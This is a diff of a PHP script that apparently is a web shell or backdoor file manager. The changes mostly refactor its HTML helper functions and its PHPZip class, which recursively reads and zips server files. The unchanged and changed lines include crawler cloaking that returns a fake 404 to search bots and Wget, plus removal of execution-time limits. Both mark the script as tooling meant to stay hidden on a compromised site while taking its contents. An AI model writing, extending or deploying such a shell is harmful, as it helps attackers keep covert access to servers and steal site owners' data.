@@ -20,20 +20,20 @@ define('SROOT', dirname(__file__) . DS);
 @ini_alter('allow_url_fopen', 1);
 
 @error_reporting(7);
-@ini_set('memory_limit', '64M'); //change it if phpzip fails
+@ini_set('memory_limit', '128M'); //change it if phpzip fails
 @set_magic_quotes_runtime(0);
 @set_time_limit(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 
 $uAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
-if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
+if (empty($_SERVER['HTTP_USER_AGENT']) || preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
     header('HTTP/1.0 404 Not Found');
     exit;
 }
 
 if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
-	header("Content-Type: text/html; charset=$config[charset]");
+	header("Content-Type: text/html; charset={$config['charset']}");
 
 function mHide($n, $v){
 	return "<input id='$n' name='$n' type='hidden' value='$v' />";
@@ -45,41 +45,34 @@ function mLink($t, $o, $e = '', $m = true){
 }
 
 function mInput($n, $v, $tt = '', $nl = '', $c = '', $e = ''){
-	if ($tt !== '') $tt = "$tt<br>"; 
-	if ($nl !== '')
-		return "<p>$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e /></p>";
-	else
-		return "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
+	if ($tt !== '') $tt = "$tt<br>";
+
+	$input = "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
+	if ($nl !== '')	$input = "<p>$input</p>";
+		
+	return $input;
 }
 
 function mSubmit($v, $o, $nl = '', $e = ''){
-	if ($nl !== '')
-		return "<p><input class='button' type='button' value='$v' onclick='$o;return false;' $e ></p>";
-	else
-		return "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
+	$input = "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
+	if ($nl !== '') $input = "<p>$input</p>";
+	
+	return $input;
 }
 
 function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
 	$tmp = '';
 	if ($o) $o = "onchange='$o'";
 	if ($t) $t = "$t<br>";
-	if ($nk){
-		foreach ($v as $value){
-			if ($s == $value)
-				$tmp .= "<option value='$value' selected='selected'>$value</option>";
-			else 
-				$tmp .= "<option value='$value'>$value</option>";
-		}
-	} else {
-		foreach ($v as $key=>$value){
-			if ($s == $value)
-				$tmp .= "<option value='$key' selected='selected'>$value</option>";
-			else 
-				$tmp .= "<option value='$key'>$value</option>";
-		}
+	foreach ($v as $key => $value){
+		if ($nk) $key = $value;
+		$tmp .= "<option value='$key'" . ($s == $key ? " selected='selected'" : "") . ">$value</option>";
 	}
+
 	$tmp = "$t<select class='theme' id='$n' name='$n' $o $e>$tmp</select>";
-	if ($nl) $tmp = "<p>$tmp</p>";
+	if ($nl) 
+		$tmp = "<p>$tmp</p>";
+	
 	return $tmp;
 }
 
@@ -375,49 +368,46 @@ function zip($files, $archive){
 
 //TODO: agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
 //para poder usarlo con archivos enormes/poca memoria
-# Based on PHPZip v1.2 by DSR!
+# Based on PHPZip v1.22 by DSR!
 class PHPZip {
     var $datasec = array();
     var $ctrl_dir = array();
     var $old_offset = 0;
 
     function Zipper($basedir, $filelist){
-		$cdir = dirname($basedir . $filelist[0]) . DS;
-		$cut = strlen($cdir);
-		foreach ($filelist as $f){	
-			$f = $basedir . $f;
-			if (file_exists($f)){
-				if (is_dir($f)) $sBuff = $this->GetFileList($f, $cut);
-				else if (is_file($f)){
-					$fd = fopen($f, 'r');
-					$sBuff = @fread($fd, filesize($f));
-					fclose($fd);
-					$this->addFile($sBuff, substr($f, $cut));
-				}
-			}
+        $cut = strlen(dirname($basedir . $filelist[0])) + 1;
+        foreach ($filelist as $f){   
+            $f = $basedir . $f;
+            if (is_dir($f))
+                $this->AddFolderContent($f, $cut);
+            else if (is_file($f))
+                $this->addFileProc($f, $cut);
         }
-        $out = $this->file();
-		
-        return 1;
     }
 
-    function GetFileList($dir, $cut){
-        if (file_exists($dir)){			
-            $h = opendir($dir);
-            while ($f = readdir($h)){
-                if (($f !== '.') && ($f !== '..')){
-                    if (is_dir($dir . $f)) $this->GetFileList($dir . $f . DS, $cut);
-                    else if (is_file($dir . $f)){
-						$fd = fopen($dir . $f, 'r');
-						$sBuff = @fread($fd, filesize($dir . $f));
-						fclose($fd);
-						$this->addFile($sBuff, substr($dir . $f, $cut));
-                    }
-                }
-            }
-            closedir($h);
+    function AddFolderContent($dir, $cut){
+        if (!file_exists($dir))
+            return false;
+           
+        $h = opendir($dir);
+        while (false !== ($f = readdir($h))) {
+            if ($f === '.' || $f === '..')
+                continue;
+
+            $f = $dir . $f;
+            if (is_dir($f))
+                $this->AddFolderContent($f . DS, $cut);
+            else if (is_file($f))
+                $this->addFileProc($f, $cut);
         }
-        return 1;
+        closedir($h);
+    }
+
+    function addFileProc($file, $cut){
+        if (!file_exists($file))
+            return false;
+        
+        $this->addFile(file_get_contents($file), substr($file, $cut));
     }
 
     function unix2DosTime($t = 0){
